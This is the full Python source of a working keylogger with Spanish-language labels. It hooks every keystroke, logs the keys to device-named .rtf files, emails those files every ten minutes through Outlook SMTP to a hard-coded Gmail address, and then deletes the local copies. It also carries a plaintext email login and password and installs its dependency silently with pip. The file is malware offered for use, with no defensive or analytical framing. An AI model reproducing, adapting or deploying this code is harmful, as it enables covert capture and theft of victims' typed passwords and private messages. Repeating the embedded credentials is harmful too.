#VERSION:2
"""IMPORTS"""
# FOR EMAIL
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib, ssl
from email import encoders

# OTHER
from datetime import datetime, timedelta
import os
import json

try:
    import keyboard
except ImportError:
    print("Trying to Install required module: keyboard\n")
    os.system("python -m pip install keyboard")
    import keyboard

"""
CONSTANTS:
"""

DELAY = 10  # minutes

with open("selfinfo.json") as f:
    DEVICE_NAME = json.load(f).get("DEVICE_NAME")

SENDER = "mariaecheverriaatr@outlook.com"

RECIPIENT = "mariaecheverriaatr@gmail.com"

PASSWORD = "tugatita3000"

SYMBOLS = {
    "space": " ",
    "enter": "\n",
    "bloq mayus": "",
    "mayusculas": "[Lshift]",
    "right shift": "[Rshift]",
    "ctrl derecha": "[Rctrl]",
    "ctrl": "[Lctrl]",
    "alt gr": "[altgr]",
    "windows izquierda": "[win]",
    "aplicación": "[app]",
    "tab": "[tab]",
    "esc": "[esc]",
    "supr": "[supr]",
    "fin": "[fin]",
    "re pag": "[repag]",
    "av pag": "[avpag]",
    "inicio": "[inicio]",
    "insert": "[insert]",
    "imp pant": "[impPnt]",
    "bloq despl": "[ScrLk]",
    "pausa": "[pausa]",
    "flecha abajo": "↓",
    "flecha arriba": "↑",
    "flecha derecha": "→",
    "flecha izquierda": "←",
    "backspace": "◀",
}

"""
FUNCTIONS:
"""

def send_email(archivo, sender=SENDER, recipient=RECIPIENT, password=PASSWORD):

    PORT = 587
    SERVER = "smtp-mail.outlook.com"

    msg = MIMEMultipart()

    msg["Subject"] = archivo

    message = archivo

    msg.attach(MIMEText(message, "plain"))

    filename = archivo

    with open(filename, "rb") as pdf:

        attachment = MIMEBase("application", "octet-stream")

        attachment.set_payload(pdf.read())

    encoders.encode_base64(attachment)

    attachment.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    msg.attach(attachment)

    SSLcontext = ssl.create_default_context()

    with smtplib.SMTP(SERVER, PORT) as SERVER:

        SERVER.starttls(context=SSLcontext)

        SERVER.login(sender, password)

        SERVER.sendmail(sender, recipient, msg.as_string())


def delete_files():
    local_files = os.listdir(".")
    local_files = filter(lambda x: x.endswith(".rtf"), local_files)
    if local_files:
        for f in local_files:
            os.remove(f)
    print("archivos removidos")
    


def send_files():
    local_files = os.listdir(".")
    local_files = filter(lambda x: x.endswith(".rtf"), local_files)
    for f in local_files:
        send_email(f, SENDER, RECIPIENT, PASSWORD)
    print("archivos enviados")
    


def updateInfo():
    global fecha
    global filename
    fecha = datetime.now()
    filename = (
        DEVICE_NAME + "_" + str(fecha).replace(":", "_").replace(".", "_") + ".rtf"
    )
    print("se actualizo el archivo")



def callb(k):
    if k.event_type == "down":
        key = SYMBOLS.get(k.name, k.name)
        with open(filename, "a", encoding="utf-8") as f:
            f.write(key)
            print(key)

def run():
    send_files()
    updateInfo()
    delete_files()

    keyboard.hook(callb)

    while True:
        if datetime.now() >= fecha + timedelta(minutes=DELAY):
            try:
                send_files()
                delete_files()
            except FileNotFoundError:
                print("archivo no encontrado")
            updateInfo()



if __name__ == "__main__":
    run()
